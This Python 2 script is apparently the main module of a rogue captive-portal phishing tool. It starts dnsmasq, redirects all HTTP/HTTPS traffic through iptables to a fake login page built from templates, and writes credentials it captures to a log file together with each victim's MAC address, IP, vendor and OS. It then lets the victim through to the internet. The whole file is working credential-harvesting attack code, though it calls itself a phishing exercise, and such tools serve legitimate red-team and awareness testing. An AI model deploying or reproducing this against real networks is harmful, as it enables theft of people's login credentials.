#!/usr/bin/env python2

import subprocess
import os
import logging
import logging.config
import time
import sys
import argparse
from threading import Thread
from subprocess import Popen, PIPE, check_output
from shutil import copyfile
from common.configuration import ConfigurationManager
import common.html_template as html_template
import common.webapp as webapp
import common.firewall as firewall
import common.victim as victim
import common.dns_dhcp as dns_dhcp

logger = logging.getLogger(__name__)

class CaptivePortal:
    """This singleton class handles the whole Phishing excercise"""

    # Instance will be stored here.
    __instance = None

    @staticmethod
    def get_instance():
        """Return the instance of the class or create new if none exists."""
        if CaptivePortal.__instance is None:
            CaptivePortal()
        return CaptivePortal.__instance
    
    def __init__(self):
        """Initialize the class."""
        if CaptivePortal.__instance:
            raise Exception('Error: %s class is a singleton!' % self.__class__)
        else:
            CaptivePortal.__instance = self

        # Initialization
        self.config = None
        self.dnsmasq = dns_dhcp.Dnsmasq.get_instance()
        self.firewall = firewall.Fw()
        self.victim_manager = None
        self.template_manager = None
        self.target_template = None
        self.allowed_clients = []
        self.credential_log_fd = None
        self.credential_log_file_path = None

    def stop(self):
        logging.info('[*] Closing ...')
        self.firewall.on_exit()
        self.dnsmasq.stop_service()
        sys.exit(0)

    def log_credentials(self, victim):
        """Writes credentials in log file"""
        logging.debug('[D] Attempting to log credentials in file ...')
        if victim is not None:
            try:
                self.credential_log_fd.write('timestamp|mac|ip|vendor|os|credential_list\n')
                self.credential_log_fd.write(str(victim.timestamp) + '|')
                self.credential_log_fd.write(victim.mac_address + '|')
                self.credential_log_fd.write(victim.ip_address + '|')
                self.credential_log_fd.write(victim.vendor + '|')
                self.credential_log_fd.write(victim.os + '|')
                for creds in victim.credentials:
                    self.credential_log_fd.write(str(creds) + '|')
                self.credential_log_fd.write('\n')
                self.credential_log_fd.flush()
                logging.info('[*] Credentials saved on %s ...' % self.credential_log_file_path)
            except Exception as e:
                logging.debug('[D] Error on writing credentials to file ...')
                logging.debug(e)

    def got_credentials(self, ip, data):
        """Method passed as callback to the Captive Portal webapp"""
        logging.debug('[D] Got credentials (callback) ...')
        self.victim_manager.add_credentials(ip, data)
        v = self.victim_manager.get_victim(ip)
        self.log_credentials(self.victim_manager.get_victim(ip))
        logging.info('[+] New Credentials obtained from %s :' % ip)
        logging.info('    -> %s' % data)
        
        if ip not in self.allowed_clients:
            logging.info('[*] Providing internet access to %s ...' % ip)
            self.firewall.do_not_redirect_host(ip)

    def start(self, config):
        # Starting
        self.config = config
        now = time.strftime('%Y-%m-%d %H:%M')
        logging.info('[*] Starting at %s ...' % now)

        # Init credentials log
        filename = ''
        try:
            timestamp = time.strftime('%Y%m%d_%H%M')
            dot_index = self.config.credentials_log_file.rfind('.')
            if dot_index != -1:
                filename = self.config.credentials_log_file[:dot_index]
                filename += '_' + timestamp
                filename += self.config.credentials_log_file[dot_index:]
            else:
                filename = self.config.credentials_log_file + '_' + timestamp

            self.credential_log_file_path = filename
            self.credential_log_fd = open(filename, 'w')
        except Exception as ex:
            self.credential_log_fd = None
            logging.info('[-] Error when opening the credentials log file (%s) ...' % filename)
            logging.debug(ex)

        # Check Dnsmasq presence on the system
        if not self.dnsmasq.check_installed():
            log.info('[-] Dnsmasq appears not to be installed on the system.')
            log.info('[!] Ensure it is installed and reachable from the $PATH and run again.')
            sys.exit(-1)
        
        # Init Victim Manager
        self.victim_manager = victim.VictimManager(self.config.mac_prefix_file, 
                                                   self.config.url_to_os_file)

        # Init Dnsmasq
        self.dnsmasq.dns_conf_path = self.config.dnsmasq_config_file
        self.dnsmasq.dhcp_lease_file = self.config.dhcp_lease_file
        self.dnsmasq.log_file = self.config.dnsmasq_log_file
        self.dnsmasq.interface = self.config.target_iface
        self.dnsmasq.gw_ip = self.config.network_gw_ip
        self.dnsmasq.net_mask = self.config.network_mask
        self.dnsmasq.dns_server = self.config.public_dns
        self.dnsmasq.dhcp_lease = self.config.dhcp_lease
        self.dnsmasq.stdout = self.config.dev_null
        self.dnsmasq.stderr = self.config.dev_null
   
        logging.info('[*] Starting dnsmasq ...')
        self.dnsmasq.start_service()

        logging.info('[*] Cleaning iptables rules from the system ...')
        self.firewall.clear_rules()

        if self.config.internet_iface is not None:
            logging.info('[*] Configuring NAT for providing Internet via %s ...' % self.config.internet_iface)
            self.firewall.nat(self.config.target_iface, self.config.internet_iface)
            self.firewall.set_ip_fwd()

        # Initially it forwards all 80/443 to the captive portal
        logging.info('[*] Configuring iptables for redirecting HTTP(s) to this host ...')
        self.firewall.redirect_http_to_localhost()
        self.firewall.set_route_localnet()

        # Initialize template manager
        logging.info('[*] Loading phishing scenarios from %s ...' % self.config.template_dir)
        self.template_manager = html_template.TemplateManager(self.config.template_dir)
        template_list = self.template_manager.templates
        
        # check if the template argument is set and is correct
        if self.config.target_template_name in template_list:
            self.target_template = template_list[self.config.target_template_name]
            logging.info('[*] Selecting "' + self.target_template.display_name + '" template ...')
        else:
            logging.info('[-] The specified template (%s) does not exist.' % self.config.target_template_name)
            sys.exit(-1)

        # Start HTTP server in a background thread
        logging.info('[*] Starting HTTP/HTTPS server at ports %s/%s ...' % (str(self.config.http_port), 
                                                                            str(self.config.https_port)))

        # Create and configure the captive portal
        app = webapp.LoginForm()
        app.ip = self.config.network_gw_ip
        app.http_port = self.config.http_port
        app.https_port = self.config.https_port
        app.html_path = self.target_template.html_dir_path
        app.static_path = self.target_template.static_dir_path
        app.cert_path = self.config.certificates_file
        app.login_url = self.config.login_url
        app.login_params = self.config.login_parameters
        app.check_url_callback = victim.VictimManager.get_instance().update_os
        app.cred_found_callback = self.got_credentials

        # Run the webapp
        webserver = Thread(target = app.runWebApp)
        webserver.daemon = True
        webserver.start()

        time.sleep(1.5)

        try:
            while True:
                # Update the list of victims
                new_clients = self.dnsmasq.get_new_clients()
                if len(new_clients) > 0:
                    logging.info('[+] New victim(s):')
                    for client in new_clients:
                        self.victim_manager.add(client[0], client[1])
                        logging.info('    MAC: %s / IP: %s' % (client[0], client[1]))                        

                # Wait 1 second
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()         



if __name__ == "__main__":
    description = ''
    epilog_help = ''''''
    # Main Arguments
    parser = argparse.ArgumentParser(description=description, epilog=epilog_help, 
                                     formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('-i', '--target-iface', required=True, dest="target_iface", type=str, help='Interface used to host the captive portal (e.g. -ti wlan1)')
    parser.add_argument('-o', '--internet-iface', required=False, dest="internet_iface", type=str, default=None, help='Interface used for reaching Internet (e.g. -ii wlan0)')
    parser.add_argument('-t', '--template', required=True, dest="target_template", type=str, help='HTML Login template for the Captive Portal.')
    parser.add_argument('-d', '--debug', required=False, dest="debug", action='store_true', help='Turn DEBUG output ON')

    options = parser.parse_args()

    # Init configuration manager
    config = ConfigurationManager()
    config.load_config('config.ini')

    # Check root invokation
    if os.geteuid():
        print '[-] Non root user detected.'
        print '[!] Please run again as root.'
        sys.exit(-1)

    # Logs configuration
    fileLogFormatter = logging.Formatter("%(asctime)s [%(threadName)-12.12s] [%(levelname)-5.5s]  %(message)s")
    consoleLogFormatter = logging.Formatter("%(message)s")
    rootLogger = logging.getLogger()

    fileHandler = logging.FileHandler(config.log_file)
    fileHandler.setFormatter(fileLogFormatter)
    
    consoleHandler = logging.StreamHandler()
    consoleHandler.setFormatter(consoleLogFormatter)

    rootLogger.addHandler(fileHandler)
    rootLogger.addHandler(consoleHandler)

    if options.debug is True:
        rootLogger.setLevel(logging.DEBUG)
    else:
        rootLogger.setLevel(logging.INFO)

    # Setting config passed via parameters
    config.target_iface = options.target_iface
    config.internet_iface = options.internet_iface
    config.target_template_name = options.target_template

    try:
        captive_portal = CaptivePortal.get_instance()
        captive_portal.start(config)
    except KeyboardInterrupt:
        logging.info('[!] (^C) interrupted!')
        captive_portal.stop()
    except EOFError:
        logging.info('[-] (^D) interrupted!')

